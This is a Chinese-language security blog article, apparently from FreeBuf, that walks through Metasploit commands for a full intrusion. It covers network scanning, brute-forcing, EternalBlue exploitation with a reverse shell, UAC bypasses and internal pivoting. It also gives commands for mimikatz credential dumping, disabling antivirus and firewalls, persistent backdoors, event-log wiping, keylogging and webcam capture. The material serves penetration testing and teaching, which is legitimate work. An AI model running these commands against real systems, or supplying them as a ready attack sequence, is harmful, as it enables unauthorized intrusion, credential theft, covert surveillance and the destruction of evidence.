**![1.png](https://image.3001.net/images/20190803/1564816110_5d4532ee8dd62.png!small)在渗透过程中，MSF漏洞利用神器是不可或缺的。更何况它是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。是信息收集、漏洞扫描、权限提升、内网渗透等集成的工具。**  

前不久MSF从4.7升级到MSF5.0,其中改进了数据库的处理逻辑，优化了msfconsole终端操作，并将PostgreSQL作为一个RESTful服务单独运行。此外还加入一个Web服务框架，新的免杀模块，优化了控制功能等。

下面小白总结了一下在渗透测试中，使用频率较多的MSF命令，分为以下几块来讲。

![2.png](https://image.3001.net/images/20190803/1564816144_5d45331006980.png!small)

##  **信息收集**

发现目标网段的存活主机:

我们可以利用auxiliary这个模块来获取目标网端的信息，包括端口开放情况、主机存活情况。

> auxiliary/scanner/discovery/arp_sweep
>
> auxiliary/scancer/smb/smb_version 存活的445主机
>
> auxiliary/scanner/portscan/syn 端口扫描
>
> auxiliary/scanner/telnet/telnet_version telent服务扫描
>
> auxiliary/scanner/rdp/rdp_scanner 远程桌面服务扫描
>
> auxiliary/scanner/ssh/ssh_version ssh主机扫描
>
> 。。。。。。

![3.png](https://image.3001.net/images/20190803/1564816174_5d45332e7542f.png!small)

 **图片一扫描模块信息**

一般情况下我们在渗透测试的时候，如果在不知道资产的情况下，我们会把整个网端进行扫描存活主机，然后再对存活的信息收集信息，这样的话就可以缩短我们的渗透测试时间，而不盲目的去测试，有时候盲目信息收集会导致后期渗透的道路都是弯的，达不到预期的效果。

不管是端口扫描还是探测存活主机，都是要设置目标IP地址set rhosts ip地址，如果扫描整个网段的话，最后设置一下线程：set thread
线程数(根据情况设置)。

![4.png](https://image.3001.net/images/20190803/1564816212_5d45335454412.png!small)

执行run命令开始扫描网段的存活主机，发现有7台服务器存活，这样的话我们就可以对这些存活主机进行下一步的信息收集，比如22、445、3389等敏感端口开放情况探测，在这里需要说明一下，以小白的渗透测试经验，一般我先不扫描整个网端，因为这样对目标主机有损耗，可以直接扫描有溢出漏洞的高危端口，如果有的话，那么就可以通过溢出进行提权，这样的方法也是一种捷径。相反的情况下，如果全端口扫描的话个人建议用nmap工具。

![5.png](https://image.3001.net/images/20190803/1564816224_5d453360ab964.png!small)

下面我们探测一下网段中开启445端口的主机，通过扫描发现网段中有3台主机开启了445端口，这样的话我们就可以在后期的漏洞探测中测试是否存在永恒之蓝漏洞。

> Use auxiliary/scanner/smb/smb_version
>
> Set rhosts 192.168.201.1/24 //设置目标主机地址
>
> Set threads 30 //设置扫描线程
>
> Run //执行扫描命令

![6.png](https://image.3001.net/images/20190803/1564816243_5d45337321ce5.png!small)![7.png](https://image.3001.net/images/20190803/1564816256_5d4533806d304.png!small)

前期其它的端口扫描的命令都是差不多的，下面我们介绍一下爆破的模块，在kali中有自己内置的密码本，当然你也可以用自己的字典。你看多方便，想用就用，不用就不用。

内置密码表的地址：/usr/share/wordlists/metasploit/

![8.png](https://image.3001.net/images/20190803/1564816314_5d4533bad5164.png!small)

一般爆破的话我们可以对ssh、mysql、sql、Oracle、vnc、telnet等常用的端口

> 1）auxiliary/scanner/mysql/mysql_login
>
> 2）auxiliary/scanner/mssql/mssql_login
>
> 3）auxiliary/scanner/ssh/ssh_login
>
> 4）。。。。。。

##  **漏洞探测**

接下来我们通过前期的信息收集，可以得到目标主机中有三台主机开启了445端口，我们可以进一步探测是不是存在永恒之蓝漏洞。我们可以用以下命令来探测一下：

在之前做培训的时候，本地搭建测试环境发现2008
R2的服务器漏洞验证的时候就直接蓝屏，具体原因不清。所以大家在渗透测试的过程中一定要合理的评估漏洞的可用性。通过扫描发现有一台目标主机存在永恒之蓝漏洞。其实除了永恒之蓝，也有许多其它的溢出漏洞，在这里就不一一详解了，原理都一样。

> use auxiliary/scanner/smb/smb_ms17_010 //使用永恒之蓝探测模块
>
> how options 查看需要添加的信息
>
> set rhosts 192.168.205.1/24 //设置扫描目标主机IP地址
>
> set threads 30 //设置扫描线程
>
> Run //开启扫描

![9.png](https://image.3001.net/images/20190803/1564816345_5d4533d9cdec1.png!small)

![10.png](https://image.3001.net/images/20190803/1564816361_5d4533e9edeb2.png!small)

##  **漏洞利用**

通过漏洞探测阶段我们发现192.168.205.150这台目标主机存在永恒之蓝漏洞，那我们可以使用MSF中的攻击模块进行漏洞攻击，看看能不能获取到目标主机的webshell，这样的话，我们就可以通过溢出漏洞来搞内网的横向扫描。执行以下命令：

> use exploit/windows/smb/ms17_010_eternalblue //使用永恒之蓝攻击模块
>
> set payload windows/meterpreter/reverse_tcp
> //设置一个Payload，使攻击机接受来自目标主机的session
>
> set rhosts 192.168.205.150 //设置目标主机地址
>
> set lhost 192.168.205.148 //设置接受payload的地址，我们这里设置MSF的地址
>
> set LPORT 5555 // 设置接受的端口，这个自己自定义，只要不与其它端口冲突就可以
>
> Exploit //执行攻击命令

![11.png](https://image.3001.net/images/20190803/1564816449_5d4534416452b.png!small)

**![3.png](https://image.3001.net/images/20190803/1564817604_5d4538c42337c.png!small)**

##  **权限提升**

当我们得到一个目标主机返回的shell后，我们第一步要看的是当前用户是不是管理员权限，如果不是管理员权限，这个时候需要我们去提权。我们可以利用kaili中的本地提权的方式，下面介绍一下本地提权绕过UAC的方式提升当前用户权限，以下是详细的命令以及步骤：

我们首先介绍一下这个UAC到底是什么东东，是怎么运行的？

### 1.什么是UAC？

Microsoft的Windows Vista和Windows Server
2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。

### 2.UAC如何运行？

UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。

因为有的用户是没有管理员权限，没有管理员权限是运行不了哪些只能通过管理员权限才能操作的命令。比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作。

最直接的提权命令：getsystem

绕过UAC防护机制的前提是我们首先通过explloit获得目标主机的meterprter。获得meterpreter会话1后，输入以下命令以检查是否是system权限。在这里我就不直接演示了，直接上命令，自己多练习练习即可，所话说熟能生巧。我们需要把获取到的session保存到后台，执行background

****![13.png](https://image.3001.net/images/20190803/1564816484_5d453464e0c30.png!small)****

**方法一:**

> use exploit/windows/local/bypassuac //将通过进程注入使用可信任发布者证书绕过Windows
> UAC。它将生成关闭UAC标志的第二个shell。
>
> set session 1 //使用sessino 1
>
> Exploit //执行权限提升的攻击模式

执行完毕成功后，再次查询当前用户的权限就会提升到管理员权限。我这里已经是管理员权限了，所以会出现这样的提示。

**![14.png](https://image.3001.net/images/20190803/1564816524_5d45348cecec6.png!small)**

![15.png](https://image.3001.net/images/20190803/1564816548_5d4534a49264b.png!small)

**方法二：Windows权限提升绕过UAC保护（内存注入）**

此模块将通过进程注入使用可信任的发布者证书绕过Windows
UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload
二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。执行完毕以下命令，当前用户权限就会变为管理员权限。

    
    
    use exploit/windows/local/bypassuac_fodhelper
    
    set session 1
    
    Exploit

 **方法三：通过COM处理程序劫持**

首先介绍一下这个COM处理程序劫持，此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows
UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项。这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，此模块将无法正常运行。

命令执行：

    
    
    use exploit/windows/local/bypassuac_comhijack
    
    set session 1
    
    Exploit

 **方法四：通过Eventvwr注册表项**

首先介绍一下这个模块，此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows
UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE
::Custom，则应在单独的进程中启动payload后调用ExitProcess（）。

    
    
    use exploit/windows/local/bypassuac_eventvwr
    
    set session 1
    
    Exploit

以上的本地提权的模块大家可以本地去测试一下，除了这些某块还有其它的通过直接通过incognito中的add_localgroup_user提升、ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18_8120_win32k_privesc域权限提升等其它的权限提升方法。小白在内网渗透测试的过程中发现一些客户的服务器大多数为2003、2008服务器，很少2012、2016服务器。

## 内网渗透

既然目标主机shell也反弹了，用户权限从低权限也提升到了管理员权限，那么接下来就是我们进行内网渗透的时候了，内网渗透涉及的面比较广，在这一节也会详细的梳理一下常用的命令。
****

**![微信图片_20190803151851.png](https://image.3001.net/images/20190803/1564816737_5d453561a6ff0.png!small)**

cat //查看文件内容

Getwd //查看当前工作目录

Download //下载文件到本地

![17.png](https://image.3001.net/images/20190803/1564816749_5d45356db1b0a.png!small)

本地创建一个1.txt,将1.txt上传到目标服务器的桌面位置：

Upload /opt/1.txt 目标主机

![18.png](https://image.3001.net/images/20190803/1564816768_5d453580dcb2e.png!small)

我们在目标主机上面创建一个pass.txt,内容为hello hack!!!!,在MSF上执行download下载命令，将pass.txt下载到攻击机上面。

![20.png](https://image.3001.net/images/20190803/1564816811_5d4535ab066d4.png!small)

命令格式：Download 目标主机文件 本地文件路径

![21.png](https://image.3001.net/images/20190803/1564816820_5d4535b42e92f.png!small)

Ipconfig/ifoncig //查看目标主机IP地址；

arp –a //用于查看高速缓存中的所有项目；

route //打印路由信息；

netstat -na //可以显示所有连接的端口

Rdesktop //使用rdesktop来连接 -u 用户名 -p
密码,这个命令需要在kali上面安装一下。当我们获取到管理员账号密码的时候就可以直接本地远程登陆目标主机。

.......

![22.png](https://image.3001.net/images/20190803/1564816836_5d4535c4c4cd9.png!small)

![23.png](https://image.3001.net/images/20190803/1564816857_5d4535d9a6550.png!small)

其中路由信息对于渗透者来说特有用，因为攻击机处于外网，目标主机处于内网，他们之间是不能通信的，故需要添加路由来把攻击机的IP添加到内网里面，这样我们就可以横扫内网，就是所谓的内网代理。

首先我们需要获取网段，然后再添加路由，添加成功后就可以横向扫描内网主机。

> run get_local_subnets //获取网段
>
> run autoroute -s 192.168.205.1/24 //添加路由
>
> run autoroute -p //查看路由
>
> run autoroute -d -s 172.2.175.0 //删除网段
>
> run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。
>
> meterpreter > background //后台sessions

系统信息:

Ps //查看目标主机的进程信息

Kill //杀掉某个进程

Getuid //查看权限

Pwd 查看当前目录路径(目标主机)

Sysinfo //查看目标主机信息，比如版本信息等

Shutdown //关机操作(谨慎操作)

![24.png](https://image.3001.net/images/20190803/1564817011_5d453673304b7.png!small)

Post模块信息,这个用的比较多，比如检查目标系统是不是虚机、安装了哪些软件、补丁信息等。其实这个模块不仅限于这些模块，有兴趣的大佬可以去玩一玩。

Run post/windows/gather/checkvm //查看目标主机是否为虚机；

run post/windows/gather/enum_applications //获取目标主机安装软件信息；

Run post/windows/gather/enum_patches //查看目标主机的补丁信息；

run post/windows/gather/enum_domain //查找目标主机域控。我本地没有域控；

run post/windows/manage/killav //关闭杀毒软件；

run post/windows/manage/enable_rdp //开启3389远程桌面；

run post/windows/gather/enum_logged_on_users //列举当前登陆过主机的用户；

run post/windows/gather/credentials/windows_autologin //抓取自动登陆的用户名和密码；

run post/windows/manage/enable_rdp username=xxx password=xxx
//添加远程桌面的用户(同时也会将该用户添加到管理员组) ****

**![26.png](https://image.3001.net/images/20190803/1564817052_5d45369cd5a78.png!small)**

![27.png](https://image.3001.net/images/20190803/1564817093_5d4536c5c1fa0.png!small)

Load命令是加载模块的，在测试中用的最多的就是抓取用户密码的这个模块。

load mimikatz //加载mimikatz，用于抓取密码，不限于明文密码和hash值；

Run hashdump //获取用户密码hash值

msv //获取的是hash值

Ssp //获取的是明文信息

wdigest //读取内存中存放的账号密码明文信息

mimikatz_command -f samdump::hashes //获取用户hash

mimikatz_command -f handle::list //列出应用进程

mimikatz_command -f service::list //列出服务

![28.png](https://image.3001.net/images/20190803/1564817112_5d4536d8446ff.png!small)

##
![29.png](https://image.3001.net/images/20190803/1564817121_5d4536e1d50af.png!small)

##  **后门持久化**

 **权限维持**

 **Persistence模块**

我们先看一下Persistence模块信息：

Run persistence -h //查看帮助信息；

run persistence -U -i 5 -p 5555 -r 192.168.205.148

-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；

-i：设置反向连接间隔时间，单位为秒；

-p：设置反向连接的端口号；

-r：设置反向连接的ip地址。

![30.png](https://image.3001.net/images/20190803/1564817160_5d4537081f1ce.png!small)

 **Metsvc 模块** **：**

这个模块使用非常简单，我们首先看一下这个模块的信息:

**![31.png](https://image.3001.net/images/20190803/1564817194_5d45372a9bb67.png!small)**

直接运行run metsvc，命令执行完毕后在目标主机上面就会有一个meterpreter这个服务，类型为自动启动。

开启另一个客户端用hander下的监听模块，重新获取shell，这里的监听的端口为31337

![32.png](https://image.3001.net/images/20190803/1564817207_5d4537373f56c.png!small)

![33.png](https://image.3001.net/images/20190803/1564817286_5d45378640359.png!small)

##  **痕迹清除**

在渗透入侵的过程中难免会留下一下日志信息痕迹，我们可以使用此命令来擦除留下的痕迹：

clearev这个命令是最直接的删除日志的命令。

运行命令后目标主机上面的日志会全部删除。

![34.png](https://image.3001.net/images/20190803/1564817300_5d4537940a5e9.png!small)

##  **补充其它**

除了上述的外，下面在汇总一些其它的操作命令

Run getgui -e //开启远程桌面；

Run getgui -u cmdback -p 123123 //添加用户

Run getgui -f 4446 -e //将目标主机上面的3389端口转发到4446

netsh advfirewall set allprofiles state off //关闭防火墙

Webscan_list //查看摄像头列表；

Webscan_stream //摄像头视频获取；

Webscan_chat //查看摄像头接口；

steal_token 试图窃取指定（PID）进程的令牌

use incognito //加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)

list_tokens –u //列出目标主机用户的可用令牌

list_tokens –g //列出目标主机用户组的可用令牌

keyscan_start //开启键盘记录功能

keyscan_dump //显示捕捉到的键盘记录信息

keyscan_stop //停止键盘记录功能

run post/windows/gather/enum_chrome //获取谷歌缓存

run post/windows/gather/enum_firefox //获取火狐缓存

run post/windows/gather/enum_ie //获取IE缓存

screenshot //截屏 **  
**

 ***本文作者：cmdgaga，转载请注明来自FreeBuf.COM**

